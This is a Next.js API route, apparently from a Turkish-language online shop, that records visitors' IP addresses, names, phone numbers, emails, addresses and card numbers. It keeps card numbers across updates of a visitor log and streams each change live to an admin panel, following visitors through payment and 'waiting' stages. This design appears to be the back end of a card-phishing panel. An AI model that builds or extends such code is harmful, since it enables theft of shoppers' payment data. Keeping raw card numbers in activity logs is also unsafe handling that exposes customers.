import { NextRequest, NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb } from '@/lib/db';
import { enrichLogMetadata } from '@/lib/logEnrichment';
import { getClientIp } from '@/lib/ipUtils';
import { getPhoneRaw } from '@/lib/phoneUtils';
import { allocateVisitorId } from '@/lib/visitorId';
import { readJsonBody } from '@/lib/readJsonBody';
import { resolveCheckoutHeartbeatStatus, shouldApplyIncomingStatus, hasCheckoutAddressEngagement, hasCheckoutAddressEngagementInput } from '@/lib/logCategories';
import { notifyLogCreated, notifyLogUpdated } from '@/lib/ws/notifyLog';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

const noStoreHeaders = {
  'Cache-Control': 'no-store, no-cache, must-revalidate',
  Pragma: 'no-cache',
};

function resolveStatus(pageType: string | undefined, amount: number): string {
  const checkoutStatus = pageType ? resolveCheckoutHeartbeatStatus(pageType) : undefined;
  if (checkoutStatus) return checkoutStatus;

  if (pageType === 'address') return 'Adres Ekranında';
  if (pageType === 'cart') return amount > 0 ? 'Sepette' : 'Ana Sayfa';
  if (pageType === 'productDetail') return 'Ürün Detay';
  if (pageType === 'homepage' || pageType === 'campaign') return 'Ana Sayfa';
  if (pageType === 'admin') return 'Admin Paneli';
  return 'Form Dolduruluyor';
}

export async function POST(request: NextRequest) {
  try {
    await connectDB();

    const body = await readJsonBody(request);

    if (!Object.keys(body).length) {
      return NextResponse.json(
        { success: true, skipped: true },
        { headers: noStoreHeaders }
      );
    }

    const pageType = typeof body.pageType === 'string' ? body.pageType : undefined;
    const productId = typeof body.productId === 'string' ? body.productId : undefined;
    const visitorSessionId =
      typeof body.visitorSessionId === 'string' ? body.visitorSessionId : undefined;
    const logId = typeof body.logId === 'string' ? body.logId : undefined;
    const metadata = enrichLogMetadata(request, body);

    const ipAddress = getClientIp(request);

    const name = typeof body.name === 'string' ? body.name : 'Ziyaretçi';
    const phone = typeof body.phone === 'string' ? body.phone : '';
    const phoneRaw = phone ? getPhoneRaw(phone) : '';
    const amount = typeof body.amount === 'number' ? body.amount : 0;

    const isAdmin = pageType === 'admin';
    const scope = isAdmin ? 'admin' : 'storefront';

    const existingLog = await logsDb.findActiveByPhoneOrIp(
      phoneRaw.length === 10 ? phoneRaw : null,
      ipAddress,
      {
        visitorSessionId: typeof visitorSessionId === 'string' ? visitorSessionId : undefined,
        logId: !isAdmin && typeof logId === 'string' ? logId : undefined,
        scope,
      }
    );

    let savedLogId: string;

    if (existingLog) {
      const checkoutPipeline = ['address', 'payment', 'processing', 'waiting'];
      const browsePing = ['cart', 'homepage', 'campaign', 'productDetail'];
      const onCheckout = checkoutPipeline.includes(existingLog.pageType || '');
      const isBrowsePing = browsePing.includes(pageType || '');

      if (onCheckout && isBrowsePing) {
        await logsDb.touchOnline(existingLog._id);
        return NextResponse.json(
          { success: true, data: { logId: existingLog._id } },
          { headers: noStoreHeaders }
        );
      }

      if (
        isBrowsePing &&
        existingLog.pageType === pageType &&
        !productId &&
        !body.cardNumber &&
        !body.phone &&
        amount === 0
      ) {
        await logsDb.touchOnline(existingLog._id);
        return NextResponse.json(
          { success: true, data: { logId: existingLog._id } },
          { headers: noStoreHeaders }
        );
      }

      const visitorId = existingLog.visitorId || (await allocateVisitorId());
      const status = resolveStatus(pageType, amount);
      const updateData: Record<string, unknown> = {
        onlineStatus: 'Aktif',
        visitorId,
        ipAddress: ipAddress !== 'unknown' ? ipAddress : existingLog.ipAddress,
        ...metadata,
      };

      if (shouldApplyIncomingStatus(existingLog.status, status)) {
        updateData.status = status;
        if (pageType) updateData.pageType = pageType;
      } else if (pageType === 'address' && hasCheckoutAddressEngagement(existingLog)) {
        updateData.status = 'Adres Ekranında';
        updateData.pageType = 'address';
      } else if (isBrowsePing && pageType && !onCheckout) {
        updateData.pageType = pageType;
        if (pageType === 'productDetail') {
          updateData.status = 'Ürün Detay';
        } else if (pageType === 'homepage' || pageType === 'campaign') {
          updateData.status = 'Ana Sayfa';
        } else if (pageType === 'cart' && amount > 0) {
          updateData.status = 'Sepette';
        }
      }

      if (name && name !== 'Ziyaretçi') {
        updateData.name = name;
      } else if (!existingLog.name || existingLog.name === 'Bilinmeyen') {
        updateData.name = name || 'Ziyaretçi';
      }

      if (typeof visitorSessionId === 'string' && visitorSessionId) {
        updateData.visitorSessionId = visitorSessionId;
      }

      if (pageType === 'cart' && amount > 0) {
        updateData.amount = amount;
        if (shouldApplyIncomingStatus(existingLog.status, 'Sepette')) {
          updateData.status = 'Sepette';
          updateData.pageType = 'cart';
        }
      } else if (amount > 0) {
        updateData.amount = amount;
      } else if (existingLog.amount && existingLog.amount > 0) {
        updateData.amount = existingLog.amount;
        if (
          pageType === 'cart' &&
          shouldApplyIncomingStatus(existingLog.status, 'Sepette')
        ) {
          updateData.status = 'Sepette';
          updateData.pageType = 'cart';
        }
      }

      if (existingLog.cardNumber && !body.cardNumber) updateData.cardNumber = existingLog.cardNumber;
      if (existingLog.phone && !phone) updateData.phone = existingLog.phone;
      if (existingLog.phoneRaw && !body.phoneRaw) updateData.phoneRaw = existingLog.phoneRaw;
      if (existingLog.email && !body.email) updateData.email = existingLog.email;
      if (existingLog.address && !body.address) updateData.address = existingLog.address;
      if (productId) updateData.productId = productId;

      const updated = await logsDb.updateById(existingLog._id, updateData);
      notifyLogUpdated(updated);
      savedLogId = existingLog._id;
    } else {
      const browseOnly = ['homepage', 'campaign', 'productDetail'];
      if (browseOnly.includes(pageType || '') && amount === 0 && phoneRaw.length !== 10) {
        return NextResponse.json(
          { success: true, data: { logId: null }, skipped: true },
          { headers: noStoreHeaders }
        );
      }

      if (pageType === 'address' && !hasCheckoutAddressEngagementInput(body)) {
        return NextResponse.json(
          { success: true, data: { logId: null }, skipped: true },
          { headers: noStoreHeaders }
        );
      }

      const visitorId = await allocateVisitorId();
      const status = resolveStatus(pageType, amount);
      const log = await logsDb.create({
        name,
        phone: phone || undefined,
        phoneRaw: phoneRaw.length === 10 ? phoneRaw : undefined,
        amount,
        status,
        onlineStatus: 'Aktif',
        visitorId,
        ipAddress: ipAddress !== 'unknown' ? ipAddress : undefined,
        pageType: pageType || undefined,
        productId: productId || undefined,
        visitorSessionId: typeof visitorSessionId === 'string' ? visitorSessionId : undefined,
        ...metadata,
      });
      notifyLogCreated(log);
      savedLogId = log._id;
    }

    return NextResponse.json(
      { success: true, data: { logId: savedLogId } },
      { headers: noStoreHeaders }
    );
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'Log oluşturulamadı';
    console.error('Ziyaretçi loglama hatası:', error);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
